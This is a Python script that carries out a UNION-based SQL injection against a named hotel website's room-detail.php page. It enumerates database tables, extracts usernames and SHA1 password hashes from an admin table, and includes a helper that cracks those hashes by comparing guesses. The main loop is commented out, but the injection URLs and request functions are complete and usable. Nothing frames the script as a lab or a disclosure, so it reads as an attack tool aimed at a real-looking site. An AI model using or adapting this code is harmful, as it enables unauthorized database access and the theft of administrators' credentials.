import hashlib
import time
import requests
import bs4
import threading
# pip command install beautifulsoup4
# pip install beautifulsoup4
# requests from http://www.embryohotel.com/room-detail.php?id=1 union select null FROM information_schema.tables

# add null in while
nomor = 0
tables = []
def hashing(check,word):
    hasher=hashlib.sha1(word.encode()) 
    c=hasher.hexdigest()
    if(str(c)==check):
        print(f"password: {word}")
    else:
        pass

def req_url(nomor, column):
    # urls = f"http://www.embryohotel.com/room-detail.php?id=-4833 UNION ALL SELECT NULL,NULL,TABLE_NAME,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.tables limit {nomor},1"
    urls = f"http://www.embryohotel.com/room-detail.php?id=-4833 UNION ALL SELECT NULL,NULL,uncompress(compress({column})),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from admin limit {nomor},1"
    response = requests.get(urls)
    # get div id id="subheader" in response.text using beautifulsoup
    soup = bs4.BeautifulSoup(response.text, 'html.parser')
    div = soup.find("div", {"id": "subheader"})
    return div.text if div else None

def req_table(nomor):
    urls = f"http://www.embryohotel.com/room-detail.php?id=-4833 UNION ALL SELECT NULL,NULL,TABLE_NAME,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.tables limit {nomor},1"
    response = requests.get(urls)
    # get div id id="subheader" in response.text using beautifulsoup
    soup = bs4.BeautifulSoup(response.text, 'html.parser')
    div = soup.find("div", {"id": "subheader"})
    return div.text if div.text.strip() != '' else None
# password_founded=False
# while True:
#     # username = req_url(nomor, "username")
#     # password_sha1 = req_url(nomor, "password")
#     # last_update = req_url(nomor, "last_update")
#     table_name = req_table(nomor)
#     # if username and password_sha1 and last_update:
#         # tables.append(f"{username};{password_sha1};{last_update}")
#     print(f"{table_name}")
#     tables.append(f"{table_name}")
    
#     if table_name == None:
#         break
#     time.sleep(1)
#     nomor += 1


# save tables into tables.txt
# with open("tables.txt", "w") as f:
#     for table in tables:
#         f.write(f"{table}\n")
#     f.close()


print("done")    